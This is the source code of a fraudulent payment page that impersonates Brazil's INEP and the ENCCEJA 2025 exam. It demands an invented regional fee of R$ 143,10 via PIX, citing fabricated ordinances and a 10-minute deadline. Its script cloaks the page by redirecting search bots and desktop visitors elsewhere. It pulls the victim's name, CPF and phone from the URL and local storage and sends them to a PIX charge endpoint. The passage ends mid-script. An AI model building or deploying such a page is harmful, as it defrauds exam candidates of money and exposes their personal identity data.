<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "qs9kqwmhmp");
    </script>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <script>
        // Função para detectar se é um dispositivo móvel
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Função para detectar se é um bot
        function isBot() {
            const botAgents = [
            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
            ];

            return botAgents.some(bot => navigator.userAgent.includes(bot));
        }

        // Função para verificar se a largura da janela é maior que 768px
        function isWideScreen() {
            return window.innerWidth > 768;
        }

        // Redirecionar ou bloquear o acesso
        function checkAccess() {
            if (isBot() || (!isMobile() && isWideScreen())) {
            // Redirecionar para o site G1 se o acesso for bloqueado
            window.location.href = "https://g1.globo.com/";
            }
        }

        // Executar a função de verificação ao carregar a página
        window.onload = checkAccess;

        // Adicionar um listener para verificar novamente se a janela for redimensionada
        window.addEventListener('resize', checkAccess);
    </script>
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1418766538994503');
        fbq('init', '1345433039826605');
        fbq('init', '1390026985502891');
        fbq('init', '190097557439571');  // Novo pixel adicionado
        fbq('init', '1226790281278977'); // Novo pixel adicionado
        fbq('track', 'PageView');
        
        // Track purchase conversion
        const eventData = {
            value: 143.10,
            currency: 'BRL',
            content_name: 'Tarifa Regional de Aplicação da Prova ENCCEJA 2025',
            content_type: 'product',
            content_ids: ['encceja-2025-tarifa-regional']
        };
        
        fbq('track', 'Purchase', eventData);
        fbq('trackSingle', '1345433039826605', 'Purchase', eventData);
        fbq('trackSingle', '1390026985502891', 'Purchase', eventData);
        fbq('trackSingle', '190097557439571', 'Purchase', eventData);
        fbq('trackSingle', '1226790281278977', 'Purchase', eventData);
    </script>
    <noscript>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1345433039826605&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1390026985502891&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=190097557439571&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1226790281278977&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Facebook Pixel Code -->
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Tarifa Regional de Aplicação da Prova</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
    <style>
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-500.woff2') format('woff2'),
                 url('/static/fonts/rawline-500.woff') format('woff');
            font-weight: 500;
            font-style: normal;
        }
        
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-700.woff2') format('woff2'),
                 url('/static/fonts/rawline-700.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        
        body {
            font-family: 'rawline', sans-serif;
        }
        
        @keyframes moveButton {
            0%, 100% { transform: translateX(0); }
            50% { transform: translateX(10px); }
        }
        #payFeeButton {
            animation: moveButton 1.5s ease-in-out infinite;
            background-color: #f44336;
        }
        #payFeeButton:hover {
            background-color: #d32f2f;
        }
        .icon-container {
            margin-top: 10px;
            position: relative;
        }
        .icon-container img {
            position: relative;
            top: 10px;
            left: 2px;
        }
        .icon-container::before {
            content: '';
            position: absolute;
            top: 10px;
            left: 0;
            height: 100%;
            width: 4px;
            background-color: #f8f9fa;
        }
        .alert-box {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .next-step-box {
            background-color: #044785;
        }
        .next-step-box p {
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 95%;
            height: 70%;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .popup-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #044785;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        .gov-header {
            background-color: #222222;
        }
        .inep-header {
            background-color: #044785;
        }
        .form-header {
            background-color: #2c5985;
            color: white;
            font-weight: 600;
        }
        .footer-bg {
            background-color: #1c2b39;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen bg-white">
    <!-- Government Header -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#">
                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6" />
            </a>
            <nav>
                <ul class="flex space-x-4 text-[10px]">
                    <li>
                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">PARTICIPE</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">SERVIÇOS</a>
                    </li>
                </ul>
            </nav>
        </div>
    </header>
    <!-- INEP Header -->
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <style>
                        .cls-2{fill:#fff}
                    </style>
                </defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
            </svg>
        </div>
    </div>
    <!-- ENCCEJA Logo -->
    <div class="text-center py-6">
        <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
    </div>

    <div class="p-6 flex flex-col items-center bg-white mt-0">
        <div class="mb-4 relative">
        </div>
        <h1 class="text-[22px] font-bold text-center mb-2">Pagamento da Tarifa Regional de Aplicação da Prova ENCCEJA 2025</h1>
        <div class="text-white text-center mb-2 bg-red-600 p-4 rounded-md">
            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"><strong>AVISO IMPORTANTE:</strong> A inscrição no ENCCEJA 2025 requer pagamento da tarifa regional. O não pagamento resultará na invalidação da sua inscrição.</p>
        </div>
    </div>
    <main class="container mx-auto px-4 py-2">
        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
            <div class="flex items-center mb-2">
                <h2 class="font-bold text-[18px]" style="color: #044785;">Prezado(a) <span id="userFirstName">Participante</span>:</h2>
            </div>
            <p class="text-[16px] leading-relaxed" style="color: #333;">
                Para concluir sua inscrição no ENCCEJA 2025 e garantir seu local de prova, é necessário efetuar o pagamento da <strong>Tarifa Regional de Aplicação da Prova (TRAP)</strong> no valor de <strong>R$ 143,10</strong>.
            </p>
            <ul class="list-none pl-0 mt-3 text-[16px] leading-relaxed" style="color: #333;">
                <li class="flex items-start mb-2">
                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <div>
                        <strong class="font-bold" style="color: #044785;">O que é a Tarifa Regional de Aplicação da Prova (TRAP):</strong> Conforme a Portaria INEP nº 123/2025, esta tarifa cobre custos logísticos específicos para a aplicação das provas em sua região, incluindo locação de espaços, equipes de fiscalização e materiais.
                    </div>
                </li>
                <li class="flex items-start mb-2">
                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <div>
                        <strong class="font-bold" style="color: #044785;">Prazo para pagamento:</strong> A tarifa deve ser paga em até 10 minutos após a conclusão da inscrição para garantir sua participação no exame de 2025.
                    </div>
                </li>
            </ul>
            <p class="mt-4 font-bold flex items-start text-[16px]" style="color: #333;">
                <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                <span>Valor a ser pago: <strong>R$ 143,10</strong></span>
            </p>
        </div>
        <div class="movements">
            <div class="icon-container pl-8 pb-4">
                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
                    <img src="https://i.ibb.co/N6g5Tq8K/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
                </div>
                <div class="mb-8" style="margin-top: -9px;">
                    <p class="font-semibold text-[17px]" style="color: #044785;">INFORMAÇÕES IMPORTANTES</p>
                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
                        <p class="mt-1 text-[16px]"><strong>ATENÇÃO:</strong> O não pagamento da Tarifa Regional resultará na <strong>impossibilidade de realizar a prova do ENCCEJA 2025</strong>. Sua inscrição será automaticamente cancelada após o prazo.</p>
                    </div>
                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
                        <p class="mt-1 text-[16px]"><strong>AVISO OFICIAL:</strong> De acordo com a Portaria MEC nº 987/2025, o participante <strong>não terá direito ao reembolso</strong> de quaisquer taxas previamente pagas em caso de cancelamento de inscrição ou não comparecimento ao exame.</p>
                    </div>
                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md">
                        REALIZAR PAGAMENTO
                    </button>
                </div>
            </div>
            <div class="mt-8 next-step-box p-4">
                <p class="font-semibold text-white text-[17px]">DEPOIS DO PAGAMENTO:</p>
                <p class="mt-2 text-white text-[16px]">Após o pagamento da Tarifa Regional, sua inscrição no ENCCEJA 2025 estará confirmada e você poderá acessar:</p>
                <div class="mt-4 text-white">
                    <p class="text-[16px]"><strong>• Cartão de Confirmação:</strong> Disponível 15 dias antes da prova</p>
                    <p class="text-[16px]"><strong>• Local de Prova:</strong> Detalhes completos com endereço e sala</p>
                    <p class="text-[16px]"><strong>• Materiais de Estudo:</strong> Acesso ao portal de estudantes</p>
                    <p class="text-[16px]"><strong>• Comprovante de Inscrição:</strong> Disponível para download</p>
                </div>
            </div>
        </div>
    </main>
    <!-- Footer -->
    <footer class="footer-bg text-white py-4 text-xs mt-8">
        <div class="container mx-auto px-4">
            <div class="flex flex-col items-center mb-2">
                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
                    <defs><style>.cls-2{fill:#fff}</style></defs>
                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
                </svg>
                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
            </div>
            <div class="flex justify-between items-center">
                <div>
                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
                </div>
                <div class="flex items-center">
                    <i class="fas fa-phone-alt mr-1"></i>
                    0800 616161
                </div>
            </div>
        </div>
    </footer>

    <div id="overlay" class="overlay" style="display: none;"></div>
    <div id="popup" class="popup" style="height: 95vh; display: none;">
        <div class="popup-content flex flex-col items-center justify-center h-[80vh]" id="loadingPopup" style="display: none;">
            <div class="loader"></div>
            <p class="mt-4 text-[18px] font-bold">Gerando Guia de Pagamento</p>
        </div>
        
        <div class="popup-content" id="pixPaymentPopup" style="display: none; width: 95%; max-width: 450px; padding: 25px; max-height: 90vh; overflow-y: auto;">
            <div class="text-center mb-3">
                <h3 class="text-[18px] font-bold text-[#044785] mb-2" id="pixPaymentTitle">Tarifa Regional de Aplicação da Prova</h3>
                <p class="text-[16px] mb-3" id="pixPaymentDescription">Para confirmar sua inscrição no ENCCEJA 2025, realize o pagamento da tarifa via PIX.</p>
                
                <div class="loader mb-3 mx-auto" id="pixStatusLoader"></div>
                
                <!-- Valor a ser pago -->
                <div class="bg-red-50 p-3 rounded-lg mb-3 border border-red-200">
                    <p class="text-[16px] font-semibold text-red-700 mb-1">Valor a ser pago: <span class="text-red-600 font-bold">R$ 143,10</span></p>
                    <p class="text-[14px] text-red-600">Tarifa Regional de Aplicação da Prova (TRAP)</p>
                </div>
                
                <!-- QR Code -->
                <div class="bg-gray-100 p-3 rounded-lg mb-3">
                    <img id="pixQrCode" src="" alt="QR Code PIX" class="w-40 h-40 mx-auto mb-2">
                    <p class="text-[16px] text-gray-600 mb-1">Escaneie o QR Code acima</p>
                </div>
                
                <!-- PIX Copy & Paste -->
                <div class="bg-gray-100 p-3 rounded-lg mb-3">
                    <p class="text-[16px] font-semibold mb-1 text-gray-700">Código PIX copia e cola:</p>
                    <div class="relative">
                        <textarea id="pixCodeText" readonly class="w-full p-3 text-[16px] bg-white border border-gray-300 rounded-md h-12 font-mono overflow-hidden resize-none"></textarea>
                    </div>
                    <button id="copyPixCodeBtn" class="mt-2 bg-[#044785] text-white font-semibold py-2 px-4 rounded-md w-full text-[16px] transition duration-300 hover:bg-[#033d71]">
                        <i class="fas fa-copy mr-2"></i>Copiar Código PIX
                    </button>
                </div>
                
                <div class="bg-blue-50 p-3 rounded-lg mb-3 border border-blue-200">
                    <p class="text-[14px] text-gray-600 font-semibold text-blue-800">
                        <i class="fas fa-info-circle mr-1"></i>Instruções:
                    </p>
                    <ol class="text-[14px] text-blue-800 list-decimal pl-5 text-left">
                        <li class="mb-1">Abra o aplicativo do seu banco</li>
                        <li class="mb-1">Escolha a opção "PIX" ou "Pagar com PIX"</li>
                        <li class="mb-1">Escaneie o QR Code ou cole o código copiado</li>
                        <li class="mb-1">Confirme o valor de R$ 143,10 e finalize o pagamento</li>
                    </ol>
                </div>
                
                <p class="text-[16px] text-gray-600 mt-2">
                    Após o pagamento, aguarde alguns instantes para a confirmação.
                    <br>O sistema verificará automaticamente o status do pagamento.
                </p>
            </div>
        </div>
    </div>

    <script>
        // Recupera dados da URL (prioridade) e do localStorage (fallback)
        function getUserData() {
            try {
                // 1. Primeiro, tente obter dados da URL (prioridade máxima)
                const urlParams = new URLSearchParams(window.location.search);
                const nameFromUrl = urlParams.get('nome');
                const cpfFromUrl = urlParams.get('cpf');
                const phoneFromUrl = urlParams.get('phone');
                
                // Inicializar objeto com valores padrão
                let userData = { 
                    nome: 'Participante', 
                    cpf: '', 
                    telefone: ''
                };
                
                // 2. Segundo, tente obter dados do localStorage específico do pagamento (paymentData)
                const paymentDataStr = localStorage.getItem('paymentData');
                if (paymentDataStr) {
                    try {
                        const paymentData = JSON.parse(paymentDataStr);
                        if (paymentData.nome) userData.nome = paymentData.nome;
                        if (paymentData.cpf) userData.cpf = paymentData.cpf;
                        if (paymentData.telefone) userData.telefone = paymentData.telefone;
                        console.log("Dados obtidos do paymentData:", paymentData);
                    } catch (e) {
                        console.error("Erro ao parsear paymentData:", e);
                    }
                }
                
                // 3. Terceiro, tente obter dados do localStorage genérico (userData)
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    try {
                        const parsedUserData = JSON.parse(storedData);
                        if (parsedUserData.nome && !userData.nome) userData.nome = parsedUserData.nome;
                        if (parsedUserData.cpf && !userData.cpf) userData.cpf = parsedUserData.cpf;
                        if (parsedUserData.telefone && !userData.telefone) userData.telefone = parsedUserData.telefone;
                        console.log("Dados obtidos do userData:", parsedUserData);
                    } catch (e) {
                        console.error("Erro ao parsear userData:", e);
                    }
                }
                
                // 4. Por último, aplique os dados da URL (maior prioridade)
                if (nameFromUrl) userData.nome = nameFromUrl;
                if (cpfFromUrl) userData.cpf = cpfFromUrl;
                if (phoneFromUrl) userData.telefone = phoneFromUrl;
                
                console.log("Dados finais (após priorização URL > paymentData > userData):", userData);
                return userData;
            } catch (e) {
                console.error('Erro ao recuperar dados do usuário:', e);
                return { 
                    nome: 'Participante', 
                    cpf: '', 
                    telefone: ''
                };
            }
        }

        // Formatar o nome adequadamente (primeira letra maiúscula)
        function formatName(name) {
            if (!name) return 'Cliente';
            
            // Converte para minúsculo e depois capitaliza a primeira letra de cada palavra
            return name.toLowerCase().split(' ').map(word => {
                // Ignora palavras curtas como "de", "da", "do", "e"
                if (['de', 'da', 'do', 'e', 'dos', 'das'].includes(word.toLowerCase())) {
                    return word.toLowerCase();
                }
                return word.charAt(0).toUpperCase() + word.slice(1);
            }).join(' ');
        }

        // Formatar CPF: XXX.XXX.XXX-XX
        function formatCPF(cpf) {
            if (!cpf) return 'CPF não disponível';
            
            // Remove qualquer caractere que não seja número
            cpf = cpf.replace(/\D/g, '');
            
            // Verifica se tem 11 dígitos
            if (cpf.length !== 11) return cpf;
            
            // Formata como XXX.XXX.XXX-XX
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }
        
        // Formatar telefone: (XX) XXXXX-XXXX
        function formatPhone(phone) {
            if (!phone) return 'Telefone não disponível';
            
            // Remove qualquer caractere que não seja número
            phone = phone.replace(/\D/g, '');
            
            // Verifica se tem 11 dígitos (com DDD)
            if (phone.length !== 11) return phone;
            
            // Formata como (XX) XXXXX-XXXX
            return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
        }

        // Formatar valor do empréstimo
        function formatCurrency(value) {
            if (!value) return 'R$0,00';
            
            // Primeiro, limpamos o valor para tratar diferentes formatos possíveis
            let cleanValue = value.toString();
            
            // Verificar se o valor contém pontos decimais (formato 10000.00)
            if (cleanValue.includes('.')) {
                // Já está no formato com ponto decimal, apenas converter para número
                const numValue = parseFloat(cleanValue);
                return `R$${numValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
            } else {
                // Se não tiver ponto decimal, trate como inteiro/centavos
                cleanValue = cleanValue.replace(/\D/g, '');
                
                // Converter para número e dividir por 100 se parece ser centavos
                const numValue = (cleanValue.length > 2) ? 
                    parseFloat(cleanValue) : 
                    parseFloat(cleanValue) * 100;
                
                // Formata como moeda brasileira
                return `R$${numValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
            }
        }

        // Obter dados do usuário
        const userData = getUserData();
        const fullName = formatName(userData.nome);
        const firstName = fullName.split(' ')[0] || 'Participante';
        const formattedCpf = formatCPF(userData.cpf);
        
        console.log("Dados do usuário obtidos:", userData);
        
        // Tentar obter dados também do paymentData
        let paymentData = {};
        try {
            const paymentDataStr = localStorage.getItem('paymentData');
            if (paymentDataStr) {
                paymentData = JSON.parse(paymentDataStr);
                console.log("Dados de pagamento obtidos:", paymentData);
            }
        } catch (e) {
            console.error("Erro ao obter dados de pagamento:", e);
        }

        // Tentar preencher dados do usuário na página se os elementos existirem
        try {
            // Nome do participante (na saudação)
            const userFirstNameElem = document.getElementById('userFirstName');
            if (userFirstNameElem) userFirstNameElem.textContent = firstName;
            
            // Outros elementos de informação do usuário podem não existir em todas as páginas
            const userElements = {
                'userFullName': fullName,
                'userCpf': formattedCpf
            };
            
            // Tentar preencher cada elemento se existir
            for (const [elemId, value] of Object.entries(userElements)) {
                const elem = document.getElementById(elemId);
                if (elem) elem.textContent = value;
            }
        } catch (e) {
            console.error("Erro ao preencher dados do usuário na página:", e);
        }

        // Nota: Os parâmetros da URL já foram processados pela função getUserData()
        console.log("Dados do usuário disponíveis para uso:", userData);

        // Obter referências para elementos (com verificações de segurança)
        const payFeeButton = document.getElementById('payFeeButton');
        const popup = document.getElementById('popup');
        const overlay = document.getElementById('overlay');

        // Verificar se os elementos necessários existem
        const elementsExist = payFeeButton && popup && overlay;
        if (!elementsExist) {
            console.log("Elementos de pagamento não encontrados na página. Esta pode ser uma página de agradecimento simplificada.");
        }

        // Função para verificar status do pagamento
        let transactionId = null;
        let checkStatusInterval = null;
        
        function checkPaymentStatus() {
            if (!transactionId) return;
            
            console.log("Verificando status do pagamento:", transactionId);
            
            fetch(`/check-for4payments-status?transaction_id=${encodeURIComponent(transactionId)}`)
                .then(response => response.json())
                .then(data => {
                    console.log("Resposta do status do pagamento:", data);
                    
                    // Verificar se o QR code e o código PIX estão disponíveis na resposta
                    let qrCodeUpdated = false;
                    let pixCodeUpdated = false;
                    
                    if (data.pix_qr_code && document.getElementById('pixQrCode')) {
                        console.log("Atualizando QR code com os dados mais recentes");
                        document.getElementById('pixQrCode').src = data.pix_qr_code;
                        qrCodeUpdated = true;
                    }
                    
                    if (data.pix_code && document.getElementById('pixCodeText')) {
                        console.log("Atualizando código PIX com os dados mais recentes");
                        document.getElementById('pixCodeText').value = data.pix_code;
                        pixCodeUpdated = true;
                    }
                    
                    // Se agora temos tanto o QR code quanto o código PIX, mas o popup de loading ainda está visível
                    if (qrCodeUpdated && pixCodeUpdated && 
                        document.getElementById('loadingPopup') && 
                        document.getElementById('loadingPopup').style.display !== 'none') {
                        console.log("Dados de pagamento carregados após verificação de status, exibindo popup");
                        document.getElementById('loadingPopup').style.display = 'none';
                        document.getElementById('pixPaymentPopup').style.display = 'block';
                    }
                    
                    // Se o pagamento foi aprovado (verificando ambos status e original_status)
                    if (data.status === 'completed' || data.status === 'COMPLETED' || 
                        data.status === 'paid' || data.status === 'PAID' || 
                        data.original_status === 'APPROVED' || 
                        data.original_status === 'PAID' || 
                        data.original_status === 'COMPLETED') {
                        
                        console.log("Pagamento APROVADO! Redirecionando para página de sucesso...");
                        clearInterval(checkStatusInterval);
                        
                        // Redireciona para a página de sucesso do ENCCEJA
                        setTimeout(() => {
                            window.location.href = '/inscricao-sucesso';
                        }, 1000);
                        
                    } else if (data.status === 'pending' || data.status === 'PENDING' || 
                               data.original_status === 'PENDING' || 
                               data.original_status === 'PROCESSING') {
                        console.log("Pagamento ainda pendente. Status:", data.original_status);
                    } else {
                        console.log("Status de pagamento desconhecido:", data.original_status);
                    }
                })
                .catch(error => {
                    console.error("Erro ao verificar status:", error);
                });
        }
        
        // Função para copiar o código PIX
        function setupPixCodeCopyButton() {
            const copyButton = document.getElementById('copyPixCodeBtn');
            const codeText = document.getElementById('pixCodeText');
            
            // Verificar se os elementos existem antes de configurar o evento
            if (!copyButton || !codeText) {
                console.log("Elementos do código PIX não encontrados na página");
                return;
            }
            
            copyButton.addEventListener('click', function() {
                codeText.select();
                document.execCommand('copy');
                
                // Feedback visual
                const originalText = copyButton.innerHTML;
                copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Código Copiado!';
                copyButton.classList.add('bg-green-600');
                
                setTimeout(() => {
                    copyButton.innerHTML = originalText;
                    copyButton.classList.remove('bg-green-600');
                }, 2000);
            });
        }
        
        // Adicionar evento de click somente se todos os elementos necessários existirem
        if (elementsExist) {
            payFeeButton.addEventListener('click', function() {
                // Mostrar overlay e popup de carregamento
                overlay.style.display = 'block';
                popup.style.display = 'flex';
                popup.style.alignItems = 'center';
                popup.style.justifyContent = 'center';
            
            const loadingPopup = document.getElementById('loadingPopup');
            loadingPopup.style.display = 'flex';
            loadingPopup.style.alignItems = 'center';
            loadingPopup.style.justifyContent = 'center';
            
            document.getElementById('pixPaymentPopup').style.display = 'none';
            
            // Preparar os dados para o pagamento
            const paymentAmount = 143.10; // Valor da Tarifa Regional de Aplicação da Prova (TRAP)
            
            // Dados limpos para a API
            const cleanName = fullName;
            const cleanCpf = userData.cpf.replace(/\D/g, '');
            const email = `${cleanCpf}@participante.encceja.gov.br`;
            
            // Enviar requisição para criar o pagamento
            fetch('/create-pix-payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: cleanName,
                    cpf: cleanCpf,
                    email: email,
                    amount: paymentAmount,
                    description: "Tarifa Regional de Aplicação da Prova - ENCCEJA 2025"
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Resposta da API de pagamento:", data);
                
                // Vamos apenas mostrar o popup de pagamento PIX quando tivermos o QR code e o código PIX
                // Configurar os dados para depois fazer a verificação
                
                // Atualizar título e descrição (não necessário pois já está configurado no HTML)
                document.getElementById('pixPaymentTitle').textContent = `Tarifa Regional de Aplicação da Prova`;
                document.getElementById('pixPaymentDescription').textContent = 
                    `Para confirmar sua inscrição no ENCCEJA 2025, realize o pagamento da tarifa via PIX.`;
                
                // Configurar o QR code e código PIX (adaptados para ambas APIs)
                // Tentar primeiro com os novos nomes de campos da API NovaEra
                // Configurar evento de carregamento do QR code
                const setupQrCodeLoadEvent = function(qrCodeUrl) {
                    const qrCodeImg = document.getElementById('pixQrCode');
                    qrCodeImg.onload = function() {
                        console.log("QR code carregado com sucesso");
                        
                        // Verificar se o loading ainda está visível e o QR code e código PIX estão prontos
                        if (document.getElementById('loadingPopup').style.display !== 'none' && 
                            document.getElementById('pixCodeText').value) {
                            document.getElementById('loadingPopup').style.display = 'none';
                            document.getElementById('pixPaymentPopup').style.display = 'block';
                        }
                    };
                    qrCodeImg.src = qrCodeUrl;
                };
                
                if (data.pix_qr_code) {
                    console.log("Usando QR code da API NovaEra:", data.pix_qr_code.substring(0, 50) + "...");
                    setupQrCodeLoadEvent(data.pix_qr_code);
                } else if (data.pixQrCode) {
                    // Fallback para os nomes antigos (For4Payments)
                    console.log("Usando QR code da API For4Payments:", data.pixQrCode.substring(0, 50) + "...");
                    setupQrCodeLoadEvent(data.pixQrCode);
                } else {
                    // Verificar formato da resposta de verificação de pagamento (For4Payments)
                    if (data.original_status && data.pix_qr_code) {
                        console.log("Usando QR code da verificação de pagamento:", data.pix_qr_code.substring(0, 50) + "...");
                        setupQrCodeLoadEvent(data.pix_qr_code);
                    } else if (data.pix_code) {
                        // Se temos o código PIX mas não o QR code, gerar via API externa
                        console.log("Gerando QR code via API externa a partir do código PIX");
                        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`;
                        setupQrCodeLoadEvent(qrApiUrl);
                    } else {
                        console.error("QR code não disponível na resposta da API");
                    }
                }
                
                // Código PIX para copiar e colar (compatibilidade com os dois serviços)
                if (data.pix_code) {
                    document.getElementById('pixCodeText').value = data.pix_code;
                    console.log('Código PIX encontrado (NovaEra)');
                } else if (data.pixCode) {
                    document.getElementById('pixCodeText').value = data.pixCode;
                    console.log('Código PIX encontrado (For4Payments)');
                } else {
                    // Verificar na resposta checkPaymentStatus do For4Payments
                    console.log('Verificando código PIX em campos alternativos...');
                    if (data.original_status && data.pix_code) {
                        document.getElementById('pixCodeText').value = data.pix_code;
                        console.log('Código PIX encontrado em campo alternativo');
                    } else {
                        console.error("Código PIX não disponível na resposta da API");
                    }
                }
                
                // Configurar o botão de cópia
                setupPixCodeCopyButton();
                
                // Verificar se temos os elementos necessários para mostrar o popup
                const pixQrCode = document.getElementById('pixQrCode');
                const pixCodeText = document.getElementById('pixCodeText');
                
                // Só mostrar o popup quando ambos QR code e código PIX estiverem disponíveis
                if (pixQrCode && pixQrCode.src && pixCodeText && pixCodeText.value) {
                    console.log("QR code e código PIX prontos, mostrando popup de pagamento");
                    // Esconder popup de carregamento e mostrar popup de pagamento PIX
                    document.getElementById('loadingPopup').style.display = 'none';
                    document.getElementById('pixPaymentPopup').style.display = 'block';
                } else {
                    console.error("QR code ou código PIX não estão prontos ainda");
                    // Tentar novamente depois de um pequeno delay
                    setTimeout(function() {
                        if (document.getElementById('pixQrCode').src && document.getElementById('pixCodeText').value) {
                            document.getElementById('loadingPopup').style.display = 'none';
                            document.getElementById('pixPaymentPopup').style.display = 'block';
                            console.log("QR code e código PIX carregados após delay");
                        } else {
                            console.error("QR code ou código PIX ainda não disponíveis após delay");
                        }
                    }, 1500);
                }
                
                // Salvar o ID da transação e iniciar verificação de status
                // Compatibilidade com ambas APIs
                transactionId = data.transaction_id || data.id;
                
                // Verificar status a cada 3 segundos
